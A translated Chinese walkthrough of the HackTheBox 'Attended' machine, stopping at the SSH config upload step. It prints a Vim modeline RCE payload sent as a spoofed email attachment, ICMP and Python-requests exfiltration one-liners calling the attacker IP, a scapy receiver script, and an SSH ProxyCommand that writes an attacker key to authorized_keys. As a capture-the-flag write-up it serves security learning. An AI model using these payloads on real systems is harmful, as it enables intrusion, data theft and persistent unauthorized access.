# HTB Attended渗透walkthrough
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
Attended是Insane难度的box，难度系数仅次于Rope2，预计retire之前，能获取ROOT权限的人数不足100人。这个box题目设计非常优秀，通过这个box学习到不少新姿势。
## Recon
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
    | ssh-hostkey:
    |   3072 4f:08:48:10:a2:89:3b:bd:4a:c6:81:03:cb:20:04:f5 (RSA)
    |   256 1a:41:82:21:9f:07:9d:cd:61:97:e7:fe:96:3a:8f:b0 (ECDSA)
    |_  256 e0:6e:3d:52:ca:5a:7b:4a:11:cb:94:ef:af:49:07:aa (ED25519)
    25/tcp open  smtp
    | fingerprint-strings:
    |   GenericLines, GetRequest:
    |     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
    |     5.5.1 Invalid command: Pipelining not supported
    |   Hello:
    |     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
    |     5.5.1 Invalid command: EHLO requires domain name
    |   Help:
    |     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
    |     214- This is OpenSMTPD
    |     214- To report bugs in the implementation, please contact PI:EMAIL
    |     214- with full details
    |     2.0.0: End of HELP info
    |   NULL:
    |_    220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
    | smtp-commands: proudly setup by guly for attended.htb Hello 10.10.10.221 [10.10.16.16], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP,
    |_ This is OpenSMTPD To report bugs in the implementation, please contact PI:EMAIL with full details 2.0.0: End of HELP info
box只开放了两个端口，分别是ssh的22和smtp的25，系统为比较少见的OpenBSD。
## STMP
不可能简单地进行ssh爆破，因此着手点只能是smtp服务。留意到nmap的扫描结果，可以发现attended.htb的smtp服务使用OpenSMTPD，`guly`疑似网站的开发者。可以尝试给`[PI:EMAIL](mailto:PI:EMAIL)`发送邮件。
这里我使用了被喻为smtp瑞士军刀的swaks，下载地址：
使用以下命令发送邮件给管理员
    swaks --to PI:EMAIL --from xxx@10.10.x.x -s 10.10.10.221:25
由于在内网，因此本地起stmp server服务，用于接收email。这里使用了python自带的模块，也可以自己搭一个smtp服务。
    python -m smtpd -c DebuggingServer -n 0.0.0.0:25
等待片刻，smtp服务会收到回复的邮件
    ---------- MESSAGE FOLLOWS ----------    Received: from attended.htb (attended.htb [192.168.23.2])
            by attendedgw.htb (Postfix) with ESMTP id CEAFD32DD0
            for ; Mon, 25 Jan 2021 04:18:35 +0100 (CET)
    Content-Type: multipart/alternative;
     boundary="===============3908250105861926732=="
    MIME-Version: 1.0
    Subject: Re: test Mon, 25 Jan 2021 03:09:20 +0000
    From: PI:EMAIL
    X-Peer: 10.10.10.221
    --===============3908250105861926732==
    Content-Type: text/plain; charset="us-ascii"
    MIME-Version: 1.0
    Content-Transfer-Encoding: 7bit
    hello, thanks for writing.
    i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible.
    ---    guly
    OpenBSD user since 1995
    Vim power user
    /"\
    \ /  ASCII Ribbon Campaign
     X   against HTML e-mail
    / \  against proprietary e-mail attachments
    --===============3908250105861926732==--    ------------ END MESSAGE ------------    
根据回复内容，对方只收`freshness`的邮件，因此伪造发件人为`freshness`进行发邮件
    swaks --to PI:EMAIL --from freshness@10.10.x.x -s 10.10.10.221:25
之后可以收到不同的回复
    ---------- MESSAGE FOLLOWS ----------    Received: from attended.htb (attended.htb [192.168.23.2])
            by attendedgw.htb (Postfix) with ESMTP id 7144A32D5F
            for ; Mon, 25 Jan 2021 04:24:34 +0100 (CET)
    Content-Type: multipart/alternative;
     boundary="===============4642293069139030684=="
    MIME-Version: 1.0
    Subject: Re: test Mon, 25 Jan 2021 03:15:12 +0000
    From: PI:EMAIL
    X-Peer: 10.10.10.221
    --===============4642293069139030684==
    Content-Type: text/plain; charset="us-ascii"
    MIME-Version: 1.0
    Content-Transfer-Encoding: 7bit
    hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)
    p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.
根据回复的内容，提到我们没有发送附件，并且ps中提到box安装了py2环境，因此我加上一个py脚本作为附件再次发送
    swaks --to PI:EMAIL --from freshness@10.10.x.x --attach shell.py -s 10.10.10.221:25
之后又收到一个不同的回复：
    thanks dude, i'm currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax.
    if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
    test it ASAP and let me know if you still face that weird issue.
简单意思是管理员会ssh登陆服务器，然后使用vim打开我们发给他的附件，并且如果配置文件正常，将会放入/home/shared文件夹中。
整理一下思路：我们需要构造一个恶意附件，让管理员通过vim打开后触发漏洞获取权限。下一步需要查找一下vim是否有可以RCE的漏洞。
## Vim
搜索发现 Vim 
首先制作一个test.txt，先采用ping的方式确认是否存在漏洞
    :!ping 10.10.x.x||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
注意txt最后要带一个`\n`
把test.txt作为附件发送过去，本地使用tcpdump进行监听icmp
大概等一分钟后，可以抓到box ping过来的包，证明漏洞存在。
有RCE漏洞，虽然没有回显，但是直接反弹shell就好了。然而后续测试无论是wget或是curl，都没有访问我开的http服务进行文件下载。
> i think it should stop any non RFC compliant connection.
回头看之前邮件的提示，应该是box中开启出站规则，导致正常的http协议无法出站。至此，出现本box第一道坎，能够RCE，但是没有回显，并且无法回连。
首先，想到的是类似布尔盲注的方式，通过是否有ping回来判断是否执行成功，例如判断文件是否存在可以这样写：
    :!file /home/shared/.ssh/passwd && ping -s 34 -c 1 10.10.x.x||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
但是有个问题，每次都需要等一分钟才执行命令，这样效率奇低。应该需要一种特殊的技巧来获取回显和读取文件。
###  data exfiltration
首先想到的是利用ICMP进行信息泄露，相信CTFer都见过把flag藏在icmp协议的流量分析题目吧。原理就是利用ping的`-p`参数携带信息。
例如可以这样读取/etc/passwd
    cat /etc/passwd | xxd -p -c 2 | xargs -n 1 -I '{}' ping -c 1 -t 1 -p '{}' 10.10.x.x ; ping -c 1 -t 1 -s 55 10.10.x.x
然后通过以下脚本进行接收
    import sys
    import argparse
    import scapy.all
    config = None
    def write_or_stop(pkt):
      global config
      if pkt[scapy.all.IP].len == 83:
        config.output_file.flush()
        config.output_file.close()
        return True
      payload = pkt.lastlayer().load
      print(pkt.show())
      config.output_file.write(payload[8:8+config.chunk_size])
      print(payload[0-config.chunk_size:])
      return False
    def main(argv):
      global config
      parser = argparse.ArgumentParser(description='Reassemble FILE from ICMP ECHO REQUESTs')
      parser.add_argument('-s', '--chunk-size', metavar='SIZE', type=int, default=2, help='How many bytes are exfiltrated in a single ECHO_REQUEST pkt')
      parser.add_argument('-o', '--output-file', nargs='?', type=argparse.FileType('w+'), default=sys.stdout)
      config = parser.parse_args(argv)
      scapy.all.sniff(filter="icmp[icmptype] == 8", stop_filter=write_or_stop, store=0, iface='tun0')
    if __name__ == "__main__":
      sys.exit(main(sys.argv[1:]))
kali中测试可以成功，但是利用vim漏洞缺无法成功。再次检查命令时发现使用了`|`，这会影响vim漏洞利用。
之前邮件特意提示有py2，相信是突破点，尝试使用py进行http请求
    :!python2 -c "import requests;requests.get('http://10.10.16.31/')"||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
测试发现使用python的request库可以连回来！
使用GET带data参数，可以把回显带回来
    :!python2 -c "import requests;import os;requests.get('http://10.10.x.x/',data=os.popen('id'))"||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
目前已解决命令回显的问题，但仍然无法获取反弹shell。
## SSH config
使用命令执行进行翻垃圾，发现/home/guly/tmp/.config.swp
    Host *
      User freshness
      ControlMaster auto
      ControlPath /tmp/%r@%h:%p
      ControlPersist 4h
      TCPKeepAlive yes
      ServerAliveInterval 60
这是一个OpenSSH的客户侧配置文件，一般存放在home目录下的.ssh目录中。
具体的配置示例可以参考：  
cyberciti.biz/faq/linux-unix-reuse-openssh-connection/
这里又需要回顾之前邮件回复的内容
> i’m currently out of the office but will SSH into the box immediately and
> open your attachment with vim to verify its syntax.if everything is fine,
> you will find your config file within a few minutes in the /home/shared
> folder.
管理员会使用ssh登陆box，上述文件应该就是guly切换到freshness用户用的配置文件，并且让freshness到`/home/shared`目录找config文件。
查找ssh
config的参数，发现存在一个`ProxyCommand`参数可以执行命令。那么思路很明确了，构造一个恶意的config文件，里面加入写ssh公钥的命令，然后把config文件写入到`/home/shared/`。
config文件构造如下：
    Host *
      User freshness
      ControlMaster auto
      ControlPath /tmp/%r@%h:%p
      ControlPersist 4h
      TCPKeepAlive yes
      ServerAliveInterval 60
      ProxyCommand echo "ssh-rsa AAAAC3NzaC1l......qG+NefAdLUMUMEaHnPM" >> ~/.ssh/authorized_keys
把config文件写入到`/home/shared/`
    python2 -c "import requests,os;a=requests.get('http://10.10.x.x/config');f=open('/home/shared/config','wb');f.write(a.content);f.close()"